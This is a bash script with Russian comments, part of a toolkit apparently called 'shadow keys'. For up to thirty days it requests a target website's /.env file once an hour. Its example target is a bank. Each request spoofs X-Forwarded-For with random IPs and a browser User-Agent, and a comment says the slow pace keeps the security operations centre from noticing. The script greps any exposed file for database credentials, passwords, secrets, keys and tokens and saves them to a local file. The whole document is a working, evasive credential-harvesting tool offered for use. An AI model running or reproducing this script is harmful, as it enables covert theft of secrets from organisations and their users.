#!/bin/bash
TARGET=$1
[ -z "$TARGET" ] && { echo "Usage: $0 https://bank.com [days]"; exit 1; }
DOMAIN=$(echo "$TARGET" | sed 's|https\?://||;s|/.*||')
DAYS=${2:-30}
KEY4_DIR="$HOME/.shadow_keys/$DOMAIN/key4_patience"
mkdir -p "$KEY4_DIR"

echo "[КЛЮЧ 4] ⏳ Начинаю медленный сбор на ${DAYS} дней..."

END_TIME=$(($(date +%s) + DAYS * 86400))
DRIP_COUNT=0

while [ $(date +%s) -lt $END_TIME ]; do
    IP="$((RANDOM % 255)).$((RANDOM % 255)).$((RANDOM % 255)).$((RANDOM % 255))"

    # ОДИН запрос в час. SOC не замечает.
    code=$(curl -sk --max-time 5 \
        -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0" \
        -H "X-Forwarded-For: $IP" \
        "$TARGET/.env" -o "$KEY4_DIR/drip_$DRIP_COUNT.txt" -w "%{http_code}" 2>/dev/null)

    if [ "$code" = "200" ]; then
        echo "  💎 День $((DRIP_COUNT / 24)): .env доступен!"
        grep -oP '(?:DB_|PASSWORD|SECRET|KEY|TOKEN)["\s:=]+["\']?[^"'\''\s]{8,}' "$KEY4_DIR/drip_$DRIP_COUNT.txt" 2>/dev/null >> "$KEY4_DIR/secrets.txt"
    fi

    DRIP_COUNT=$((DRIP_COUNT + 1))
    [ $((DRIP_COUNT % 24)) -eq 0 ] && echo "  📊 День $((DRIP_COUNT / 24))/$DAYS. Собрано секретов: $(wc -l < $KEY4_DIR/secrets.txt 2>/dev/null || echo 0)"

    # Ждём 1 час
    sleep 3600
done

echo "[КЛЮЧ 4] ✅ За $DAYS дней собрано $(wc -l < $KEY4_DIR/secrets.txt 2>/dev/null || echo 0) секретов"
echo "[КЛЮЧ 4] 📁 $KEY4_DIR/"
